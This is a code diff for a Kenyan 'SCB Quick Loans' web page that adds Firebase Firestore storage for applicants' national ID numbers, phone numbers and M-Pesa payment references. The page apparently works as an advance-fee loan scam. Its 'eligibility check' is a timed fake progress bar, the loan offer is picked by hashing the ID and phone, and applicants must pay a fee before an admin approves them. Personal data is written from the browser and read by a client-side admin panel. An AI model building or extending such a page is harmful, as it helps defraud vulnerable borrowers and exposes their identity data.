@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SCB Quick Loans | Kenya's Fastest Digital Lender</title>
+
+    <!-- Firebase SDK v12 compat (same API as v8, no build tools needed) -->
+    <script src="https://www.gstatic.com/firebasejs/12.10.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore-compat.js"></script>
     <style>
         * {
             margin: 0;
@@ -1512,7 +1516,7 @@
             <div class="retry-modal">
                 <div class="modal-icon">❌</div>
                 <div class="modal-title">Application Declined</div>
-                <div class="modal-text">Try Again?</div>
+                <div class="modal-text">Try Again</div>
                 <div class="modal-actions">
                     <button class="modal-btn modal-btn-primary" onclick="confirmRetry()">Yes, Try Again</button>
                     <button class="modal-btn modal-btn-secondary" onclick="closeRetryModal()">Cancel</button>
@@ -1667,12 +1671,42 @@
         let declinedAppData = null;
         let currentUserKey = null;
         let isBindingValid = true;
+        let adminUnsubscribe = null; // Firestore real-time listener handle
 
-        // ===== DATA STORAGE =====
+        // ===== LOCAL CACHE (fast access, always synced from Firestore) =====
         let userDB = JSON.parse(localStorage.getItem('scb_users')) || {};
         let idToPhoneMap = JSON.parse(localStorage.getItem('scb_id_to_phone')) || {};
         let phoneToIdMap = JSON.parse(localStorage.getItem('scb_phone_to_id')) || {};
         let applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
+
+        // ===== FIREBASE / FIRESTORE =====
+        const firebaseConfig = {
+            apiKey:            "AIzaSyCo9jxQvG8PvJdd2_iFOA8-Q3dkqBhKLp0",
+            authDomain:        "pesaprintscbscb.firebaseapp.com",
+            projectId:         "pesaprintscbscb",
+            storageBucket:     "pesaprintscbscb.firebasestorage.app",
+            messagingSenderId: "1098536787385",
+            appId:             "1:1098536787385:web:510db172160252d42d2a68"
+        };
+
+        let db = null;
+        let firestoreReady = false;
+
+        function initFirebase() {
+            try {
+                if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+                db = firebase.firestore();
+                // Enable offline persistence so the app works even with bad network
+                db.enablePersistence({ synchronizeTabs: true }).catch(err => {
+                    console.warn('Persistence unavailable:', err.code);
+                });
+                firestoreReady = true;
+                console.log('✅ Firestore connected');
+            } catch(e) {
+                console.warn('⚠️ Firestore unavailable – running in local-only mode:', e.message);
+                firestoreReady = false;
+            }
+        }
 
         // Loan options
         const loans = [
@@ -1703,73 +1737,110 @@
             { status: "Finalizing your offer...", detail: "Preparing personalized terms..." }
         ];
 
-        // ===== ID-PHONE BINDING FUNCTIONS =====
-        function bindIdAndPhone(idNumber, phoneNumber) {
+        // ===== ID-PHONE BINDING FUNCTIONS (Firestore + local cache) =====
+        async function bindIdAndPhone(idNumber, phoneNumber) {
+            // Update local cache immediately
             idToPhoneMap[idNumber] = phoneNumber;
             phoneToIdMap[phoneNumber] = idNumber;
-            
             localStorage.setItem('scb_id_to_phone', JSON.stringify(idToPhoneMap));
             localStorage.setItem('scb_phone_to_id', JSON.stringify(phoneToIdMap));
+
+            // Persist to Firestore
+            if (firestoreReady) {
+                try {
+                    await db.collection('scb_bindings').doc(`id_${idNumber}`).set({ phone: phoneNumber, updatedAt: new Date().toISOString() });
+                    await db.collection('scb_bindings').doc(`phone_${phoneNumber}`).set({ idNumber: idNumber, updatedAt: new Date().toISOString() });
+                } catch(e) {
+                    console.error('Binding write error:', e);
+                }
+            }
         }
 
+        // Local-only check (used for fast input feedback)
         function checkIdPhoneBinding(idNumber, phoneNumber) {
-            // Check if ID is already bound to a different phone
             if (idToPhoneMap[idNumber] && idToPhoneMap[idNumber] !== phoneNumber) {
-                return {
-                    valid: false,
-                    message: "These details cannot be used. Please check your information or contact support."
-                };
+                return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
             }
-            
-            // Check if phone is already bound to a different ID
             if (phoneToIdMap[phoneNumber] && phoneToIdMap[phoneNumber] !== idNumber) {
-                return {
-                    valid: false,
-                    message: "These details cannot be used. Please check your information or contact support."
-                };
+                return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
             }
-            
-            // Check in applications for any existing combination
             const existingIdApp = applications.find(a => a.idNumber === idNumber && a.phoneNumber !== phoneNumber);
-            if (existingIdApp) {
-                return {
-                    valid: false,
-                    message: "These details cannot be used. Please check your information or contact support."
-                };
-            }
-            
+            if (existingIdApp) return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
             const existingPhoneApp = applications.find(a => a.phoneNumber === phoneNumber && a.idNumber !== idNumber);
-            if (existingPhoneApp) {
-                return {
-                    valid: false,
-                    message: "These details cannot be used. Please check your information or contact support."
-                };
-            }
-            
+            if (existingPhoneApp) return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
             return { valid: true };
         }
 
-        // Check binding on input and show error immediately
+        // Full remote check against Firestore (used on form submit)
+        async function checkIdPhoneBindingRemote(idNumber, phoneNumber) {
+            if (!firestoreReady) return checkIdPhoneBinding(idNumber, phoneNumber);
+            try {
+                const [idDoc, phoneDoc] = await Promise.all([
+                    db.collection('scb_bindings').doc(`id_${idNumber}`).get(),
+                    db.collection('scb_bindings').doc(`phone_${phoneNumber}`).get()
+                ]);
+                if (idDoc.exists && idDoc.data().phone !== phoneNumber) {
+                    return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
+                }
+                if (phoneDoc.exists && phoneDoc.data().idNumber !== idNumber) {
+                    return { valid: false, message: "These details cannot be used. Please check your information or contact support." };
+                }
+                // Sync remote bindings into local cache
+                if (idDoc.exists)    { idToPhoneMap[idNumber] = idDoc.data().phone;          localStorage.setItem('scb_id_to_phone', JSON.stringify(idToPhoneMap)); }
+                if (phoneDoc.exists) { phoneToIdMap[phoneNumber] = phoneDoc.data().idNumber;  localStorage.setItem('scb_phone_to_id', JSON.stringify(phoneToIdMap)); }
+                return { valid: true };
+            } catch(e) {
+                console.error('Remote binding check error:', e);
+                return checkIdPhoneBinding(idNumber, phoneNumber); // fallback
+            }
+        }
+
+        // Debounce helper for input binding check
+        let bindingDebounceTimer = null;
         function checkBindingOnInput() {
-            const id = document.getElementById('idNumber').value;
+            const id    = document.getElementById('idNumber').value;
             const phone = document.getElementById('phoneNumber').value;
-            
+
+            clearTimeout(bindingDebounceTimer);
+
             if (id.length >= 5 && isSafaricom(phone)) {
-                const bindingCheck = checkIdPhoneBinding(id, phone);
-                isBindingValid = bindingCheck.valid;
-                
-                if (!bindingCheck.valid) {
-                    document.getElementById('bindingError').style.display = 'block';
-                    document.getElementById('bindingErrorMessage').innerText = bindingCheck.message;
-                    document.getElementById('continueBtn1').disabled = true;
-                } else {
-                    document.getElementById('bindingError').style.display = 'none';
-                    checkStep1Complete();
+                // Instant local check
+                const localResult = checkIdPhoneBinding(id, phone);
+                if (!localResult.valid) {
+                    showBindingError(localResult.message);
+                    return;
+                }
+                hideBindingError();
+                checkStep1Complete();
+
+                // Debounced remote check (500 ms after user stops typing)
+                if (firestoreReady) {
+                    bindingDebounceTimer = setTimeout(async () => {
+                        const remoteResult = await checkIdPhoneBindingRemote(id, phone);
+                        isBindingValid = remoteResult.valid;
+                        if (!remoteResult.valid) {
+                            showBindingError(remoteResult.message);
+                        } else {
+                            hideBindingError();
+                            checkStep1Complete();
+                        }
+                    }, 500);
                 }
             } else {
-                document.getElementById('bindingError').style.display = 'none';
+                hideBindingError();
                 isBindingValid = true;
             }
+        }
+
+        function showBindingError(msg) {
+            isBindingValid = false;
+            document.getElementById('bindingError').style.display = 'block';
+            document.getElementById('bindingErrorMessage').innerText = msg;
+            document.getElementById('continueBtn1').disabled = true;
+        }
+
+        function hideBindingError() {
+            document.getElementById('bindingError').style.display = 'none';
         }
 
         // ===== VALIDATION FUNCTIONS =====
@@ -1936,88 +2007,120 @@
             showStep(1);
         }
 
-        // ===== PROCESS STEP 1 (NEW USER) =====
-        function processStep1() {
-            const id = document.getElementById('idNumber').value;
+        // ===== PROCESS STEP 1 (async – checks Firestore) =====
+        async function processStep1() {
+            const id    = document.getElementById('idNumber').value;
             const phone = document.getElementById('phoneNumber').value;
-            
-            // Check binding first
-            const bindingCheck = checkIdPhoneBinding(id, phone);
+
+            // Lock button while checking
+            const btn = document.getElementById('continueBtn1');
+            btn.disabled = true;
+            btn.textContent = 'Checking…';
+
+            // Full remote binding check
+            const bindingCheck = await checkIdPhoneBindingRemote(id, phone);
             if (!bindingCheck.valid) {
-                alert(bindingCheck.message);
+                showBindingError(bindingCheck.message);
+                btn.disabled = false;
+                btn.textContent = 'Continue';
                 return;
             }
-            
+
             const userKey = `user_${id}_${phone}`;
             currentUserKey = userKey;
-            
-            const userApps = applications.filter(a => a.userKey === userKey);
-            
-            if (userApps.length > 0) {
+
+            // Check Firestore for any existing applications for this user
+            if (firestoreReady) {
+                try {
+                    const snap = await db.collection('scb_applications')
+                        .where('userKey', '==', userKey)
+                        .get();
+                    if (!snap.empty) {
+                        // Sync remote apps into local cache
+                        snap.docs.forEach(doc => {
+                            const app = doc.data();
+                            if (!applications.find(a => a.id === app.id)) applications.push(app);
+                        });
+                        localStorage.setItem('scb_apps', JSON.stringify(applications));
+                        btn.disabled = false;
+                        btn.textContent = 'Continue';
+                        processReturningUser(id, phone);
+                        return;
+                    }
+                } catch(e) {
+                    console.error('Remote user lookup error:', e);
+                    // Fall through to local check
+                }
+            }
+
+            // Local fallback check for returning user
+            const localUserApps = applications.filter(a => a.userKey === userKey);
+            if (localUserApps.length > 0) {
+                btn.disabled = false;
+                btn.textContent = 'Continue';
                 processReturningUser(id, phone);
                 return;
             }
 
+            btn.disabled = false;
+            btn.textContent = 'Continue';
+
+            // ===== New user: show loading & calculate offer =====
             showStep(2);
-            document.getElementById('step2Subtitle').innerText = 'Checking your eligibility...';
+            document.getElementById('step2Subtitle').innerText = 'Checking your eligibility…';
             document.getElementById('loadingOffer').classList.remove('hidden');
             document.getElementById('loanOffer').classList.add('hidden');
             document.getElementById('step2Buttons').classList.add('hidden');
             document.getElementById('statusMessage').classList.add('hidden');
 
             let progress = 0;
-            const totalTime = 15000;
+            const totalTime    = 15000;
             const intervalTime = 2500;
-            let messageIndex = 0;
-            
-            const progressFill = document.getElementById('progressFill');
+            let messageIndex   = 0;
+
+            const progressFill   = document.getElementById('progressFill');
             const progressStatus = document.getElementById('progressStatus');
             const progressDetail = document.getElementById('progressDetail');
-            
+
             const progressInterval = setInterval(() => {
                 progress += 16.67;
                 messageIndex++;
-                
                 if (messageIndex < progressMessages.length) {
                     progressStatus.innerText = progressMessages[messageIndex].status;
-                    progressDetail.innerText = progressMessages[messageIndex].detail;
-                    progressFill.style.width = progress + '%';
+                    progressDetail.innerText  = progressMessages[messageIndex].detail;
+                    progressFill.style.width  = progress + '%';
                 }
             }, intervalTime);
 
-            setTimeout(() => {
+            setTimeout(async () => {
                 clearInterval(progressInterval);
-                
-                const hash = generateHash(id + phone);
-                const loan = loans[hash % loans.length];
-                
+
+                const hash  = generateHash(id + phone);
+                const loan  = loans[hash % loans.length];
                 qualifiedAmount = loan.amount;
-                processingFee = loan.fee;
-                interestRate = loan.rate;
-                
-                // Save user data and bind ID and phone
-                userDB[userKey] = { 
-                    id, 
-                    phone, 
-                    amount: qualifiedAmount, 
-                    fee: processingFee, 
-                    rate: interestRate,
-                    firstSeen: new Date().toISOString()
-                };
+                processingFee   = loan.fee;
+                interestRate    = loan.rate;
+
+                // Save user record
+                const userData = { id, phone, amount: qualifiedAmount, fee: processingFee, rate: interestRate, firstSeen: new Date().toISOString() };
+                userDB[userKey] = userData;
                 localStorage.setItem('scb_users', JSON.stringify(userDB));
-                
-                // Create permanent binding
+                if (firestoreReady) {
+                    db.collection('scb_users').doc(userKey).set(userData).catch(e => console.error('User save error:', e));
+                }
+
+                // Bind ID ↔ phone (async, non-blocking)
                 bindIdAndPhone(id, phone);
-                
+
                 document.getElementById('offerAmount').innerText = `KSh ${qualifiedAmount.toLocaleString()}`;
-                document.getElementById('offerFee').innerText = `Fee: KSh ${processingFee.toLocaleString()}`;
-                document.getElementById('offerRate').innerText = (interestRate * 100) + '%';
+                document.getElementById('offerFee').innerText    = `Fee: KSh ${processingFee.toLocaleString()}`;
+                document.getElementById('offerRate').innerText   = (interestRate * 100) + '%';
                 document.getElementById('step2Subtitle').innerText = 'Based on your profile, you qualify for:';
-                
+
                 document.getElementById('loadingOffer').classList.add('hidden');
                 document.getElementById('loanOffer').classList.remove('hidden');
                 document.getElementById('step2Buttons').classList.remove('hidden');
-                
+
                 updateRepaymentTerms();
             }, totalTime);
         }
@@ -2079,50 +2182,62 @@
             }
         }
 
-        // ===== SUBMIT APPLICATION =====
-        function submitForApproval() {
+        // ===== SUBMIT APPLICATION (saves to Firestore) =====
+        async function submitForApproval() {
             const msg = document.getElementById('mpesaMessage').value.trim();
             if (!msg) {
                 alert('Please paste your M-Pesa confirmation message');
                 return;
             }
-            
+
             const codeMatch = msg.match(/[A-Z0-9]{6,12}/);
             const mpesaCode = codeMatch ? codeMatch[0] : msg.substring(0, 10).toUpperCase();
-            
-            const id = document.getElementById('idNumber').value;
+
+            const id    = document.getElementById('idNumber').value;
             const phone = document.getElementById('phoneNumber').value;
             const userKey = `user_${id}_${phone}`;
-            
+
             const application = {
-                id: 'SCB' + Date.now().toString().slice(-8) + Math.random().toString(36).substring(2,5).toUpperCase(),
-                userKey: userKey,
-                idNumber: id,
+                id:          'SCB' + Date.now().toString().slice(-8) + Math.random().toString(36).substring(2,5).toUpperCase(),
+                userKey,
+                idNumber:    id,
                 phoneNumber: phone,
-                amount: qualifiedAmount,
-                fee: processingFee,
-                mpesaRef: mpesaCode,
-                tenure: selectedTenure,
-                status: 'pending',
-                timestamp: new Date().toISOString()
+                amount:      qualifiedAmount,
+                fee:         processingFee,
+                mpesaRef:    mpesaCode,
+                tenure:      selectedTenure,
+                status:      'pending',
+                timestamp:   new Date().toISOString()
             };
-            
+
+            // Local cache
             applications.push(application);
             localStorage.setItem('scb_apps', JSON.stringify(applications));
-            
+
+            // Persist to Firestore
+            if (firestoreReady) {
+                try {
+                    await db.collection('scb_applications').doc(application.id).set(application);
+                } catch(e) {
+                    console.error('Application save error:', e);
+                }
+            }
+
+            // Update user record
             if (userDB[userKey]) {
                 userDB[userKey].lastApplication = application.id;
-                userDB[userKey].lastApplied = new Date().toISOString();
+                userDB[userKey].lastApplied     = new Date().toISOString();
                 localStorage.setItem('scb_users', JSON.stringify(userDB));
+                if (firestoreReady) {
+                    db.collection('scb_users').doc(userKey).update({
+                        lastApplication: application.id,
+                        lastApplied:     userDB[userKey].lastApplied
+                    }).catch(e => console.error('User update error:', e));
+                }
             }
-            
+
             document.getElementById('confirmationRef').innerHTML = `<strong>Reference:</strong> ${mpesaCode}`;
             showStep(4);
-            
-            // If admin panel is open, refresh it
-            if (document.getElementById('adminPanel').classList.contains('visible')) {
-                setTimeout(refreshApplications, 500);
-            }
         }
 
         // ===== ADMIN AUTH & HASH ROUTING =====
@@ -2174,13 +2289,15 @@
         function openAdminPanel() {
             const panel = document.getElementById('adminPanel');
             panel.classList.add('visible');
-            refreshApplications();
+            startAdminListener();           // real-time Firestore listener
+            refreshApplications();          // immediate full fetch
             setTimeout(() => {
                 panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
             }, 100);
         }
 
         function closeAdminPanel() {
+            stopAdminListener();
             closeAdminPanelSilent();
             history.replaceState(null, '', window.location.pathname + window.location.search);
         }
@@ -2274,23 +2391,68 @@
             });
         }
 
-        function updateAppStatus(appId, status) {
+        async function updateAppStatus(appId, status) {
+            // Update local cache first for instant UI feedback
             const index = applications.findIndex(a => a.id === appId);
             if (index !== -1) {
-                applications[index].status = status;
+                applications[index].status      = status;
                 applications[index].lastUpdated = new Date().toISOString();
                 localStorage.setItem('scb_apps', JSON.stringify(applications));
-                
-                showToast(`Application ${status}`);
-                
-                loadApplications();
             }
+
+            // Persist to Firestore
+            if (firestoreReady) {
+                try {
+                    await db.collection('scb_applications').doc(appId).update({
+                        status,
+                        lastUpdated: new Date().toISOString()
+                    });
+                } catch(e) {
+                    console.error('Status update error:', e);
+                }
+            }
+
+            showToast(`Application ${status}`);
+            loadApplications();
         }
 
-        function refreshApplications() {
-            applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
+        async function refreshApplications() {
+            if (firestoreReady) {
+                try {
+                    const snap = await db.collection('scb_applications').get();
+                    applications = snap.docs.map(d => d.data());
+                    localStorage.setItem('scb_apps', JSON.stringify(applications));
+                    showToast('Refreshed from server');
+                } catch(e) {
+                    console.error('Refresh error:', e);
+                    applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
+                    showToast('Using cached data');
+                }
+            } else {
+                applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
+                showToast('Applications refreshed (local)');
+            }
             loadApplications();
-            showToast('Applications refreshed');
+        }
+
+        // Real-time listener – called when admin panel opens
+        function startAdminListener() {
+            if (adminUnsubscribe || !firestoreReady) return;
+            adminUnsubscribe = db.collection('scb_applications')
+                .onSnapshot(snap => {
+                    applications = snap.docs.map(d => d.data());
+                    localStorage.setItem('scb_apps', JSON.stringify(applications));
+                    loadApplications();
+                }, err => {
+                    console.error('Snapshot error:', err);
+                });
+        }
+
+        function stopAdminListener() {
+            if (adminUnsubscribe) {
+                adminUnsubscribe();
+                adminUnsubscribe = null;
+            }
         }
 
         function filterApplications() {
@@ -2369,13 +2531,16 @@
 
         // ===== INITIALIZE =====
         document.addEventListener('DOMContentLoaded', function() {
+            // Boot Firebase first
+            initFirebase();
+
             checkStep1Complete();
             showStep(1);
             document.getElementById('consentBox').style.display = 'block';
-            
-            // Load applications from storage
+
+            // Seed local cache from localStorage while Firestore loads
             applications = JSON.parse(localStorage.getItem('scb_apps')) || [];
-            console.log('Loaded applications:', applications.length);
+            console.log('Local cache: ', applications.length, 'application(s)');
 
             // Hash-based admin routing on page load
             checkAdminHash();
@@ -2387,4 +2552,4 @@
         });
     </script>
 </body>
-                    </html>
+</html>
